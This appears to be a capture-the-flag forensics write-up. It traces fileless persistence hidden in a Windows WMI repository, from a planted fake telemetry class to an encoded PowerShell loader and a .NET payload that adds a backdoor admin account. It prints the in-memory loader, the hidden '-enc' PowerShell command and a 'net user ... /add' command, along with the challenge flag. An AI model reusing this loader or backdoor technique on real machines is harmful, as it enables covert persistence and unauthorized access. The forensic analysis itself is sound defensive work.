## The Tip-Off

Security at the Byte Lotus Hotel gets a strange report. The back-office machines are alive at hours they shouldn't be — logins happening long after the night-shift technician clocked out and went home.

The team does what anyone would do first: check **Startup**, check **Scheduled Tasks**, check the registry **Run keys**. Nothing. Clean as a whistle.

Then a note from someone going by `@0xMia` lands, almost taunting: _"the usual autoruns/persistence tools straight up don't catch this one — you're gonna have to dig through the raw data by hand."_

That single line reframes the whole case. If it's not showing up in any of the standard persistence spots, the attacker isn't hiding in a place anyone normally looks.

---

## Exhibit One: Four Strange Files

What lands on the desk is four files: `OBJECTS.DATA`, `INDEX.BTR`, and three `MAPPING1/2/3.MAP` files. The names aren't random — this is the internal skeleton of the **Windows WMI repository**, the CIM database Windows keeps at `%windir%\System32\wbem\Repository\` to store every WMI class definition on the box.

And there's the answer to why the autoruns tools came up empty: nobody inspects inside this repository. If someone quietly plants a fake class in there, it lives in total silence, invisible to every normal monitoring tool.

Digging for a way in turns up `python-cim`, a library out of Mandiant's `flare-wmi` project — built specifically for threat hunters to parse and walk this exact repository format.

python

```python
import cim
c = cim.CIM("win7", "/home/claude/repo")
```

The library's own log confirms the setup right away — Windows keeps three generations of the mapping file and always trusts the newest one:

```
MAPPING1.MAP: version 0x5457
MAPPING2.MAP: version 0x545a
MAPPING3.MAP: version 0x5460   ← newest, the one actually in use
```

---

## Lost in the Maze

The WMI repository isn't a flat file — it's an entire tree of namespaces (`root\CIMV2`, `root\WMI`, `root\subscription`, and dozens more), each holding hundreds of classes.

A recursive walk through the whole tree, namespace by namespace, logging every class found along the way:

python

```python
def walk(ns):
    print("NS:", ns.name)
    for cls in ns.classes:
        print("   CLASS:", cls.name)
    for child in ns.namespaces:
        walk(child)
```

The result: **roughly 3,800 distinct classes across 92 namespaces** — essentially the entire official Windows 7/10-era WMI schema. `Win32_*`, `CIM_*`, `MSFT_*`, `MDM_*`, ETW trace classes, all of it. Too much noise to eyeball one by one.

What's needed isn't more scrolling — it's a pattern that separates the real classes from whatever's been slipped in.

---

## The Thread That Unravels It

While mapping out the namespace structure, one pattern keeps repeating: every real namespace like `root\CIMV2` has a **localized twin** — `root\CIMV2\ms_409`. And every legitimate class living in `root\CIMV2` is **mirrored** into that twin too, because Windows automatically duplicates classes into the localized namespace at install time.

Which means: a genuine class always shows up **twice**. Anything manually planted into just one namespace after the fact — by someone who didn't bother replicating it into the localized copy — shows up **exactly once**.

Counting every class by how many namespaces it appears in:

python

```python
counter = Counter()
for ns, classes in ns_classes.items():
    for c in set(classes):
        counter[c] += 1
```

Filtering down to single-occurrence classes sitting inside `root\CIMV2` turns up a name standing alone among hundreds of legitimate Win32 entries:

```
1 × Win32_HardwareTelemetry   →   ['root\\CIMV2']   (no ms_409 twin!)
```

The name is crafted to sound exactly like ordinary Microsoft telemetry — but it doesn't exist in any real Windows build. **This is the plant.**

---

## Opening the Box

Pulling the instance of that class reveals a property called `ConfigData` — holding one very long base64-looking string. No genuine telemetry class stores anything like that.

A search through the raw `OBJECTS.DATA` bytes for encoded PowerShell turns up the exact line that ties it all together:

```
cmd /C powershell.exe -Sta -Nop -Window Hidden -enc JABmAGkAbABlACAAPQAg...
```

Decoding it (base64 → UTF-16LE, since PowerShell always encodes `-enc` payloads that way) reveals the full script:

powershell

```powershell
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
...
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@())) | Out-Null
```

This is the whole trick laid bare: the script reads `ConfigData` straight out of the fake class, base64-decodes it, Deflate-decompresses it, and then **loads the result as a full .NET assembly directly in memory and runs it** — no `.exe` ever touches disk.

This is textbook **fileless WMI-repository persistence**. The payload lives inside the WMI repository itself and only ever materializes for the brief moment it's executed in memory.

---

## Extracting the Payload

Replaying exactly what the script does:

python

```python
raw = base64.b64decode(config_data_b64)
data = zlib.decompress(raw, -15)      # -15 = raw Deflate, no header
open("payload.bin", "wb").write(data)
```

```
$ file payload.bin
payload.bin: PE32 executable ... Mono/.Net assembly, for MS Windows
```

Success — a fully valid `.exe` reconstructed from a single property buried inside a WMI class.

---

## Dissecting the Executable

Strings inside the binary reveal its internal name, `updates.exe`, and a class called `AfterHours` — a fitting signature. References to `Environment.MachineName` and `Process.Start` hint at a conditional trigger.

Pulling the wide (UTF-16) strings surfaces the real logic:

```
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.
```

The binary checks whether the machine's hostname is `bytelotusdc` — matching a real machine on the hotel's network. If it matches, it silently creates a **backdoor admin account named `patch`**, with a base64 string passed in as its "password."

---

## The Final Reveal

That "password" isn't a password at all — it's the flag, hiding in plain base64:

python

```python
base64.b64decode("VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9").decode()
```

```
THM{P4tch_op3ned_th3_BacKd00r}
```
